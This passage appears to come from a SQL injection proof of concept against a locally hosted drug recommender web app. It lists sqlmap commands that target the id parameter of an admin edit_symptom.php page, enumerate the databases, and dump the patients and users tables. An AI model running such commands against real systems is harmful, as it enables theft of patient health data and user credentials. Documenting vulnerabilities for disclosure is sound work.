...
Command: python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_symptom.php?id=1 –dbs
...
Command: python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_symptom.php?id=1 -D drug_recommender -T patients –dump

![POC](images/sqli_4.png)
![POC](images/sqli_5.png)

Command: python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_symptom.php?id=1 -D drug_recommender -T users –dump
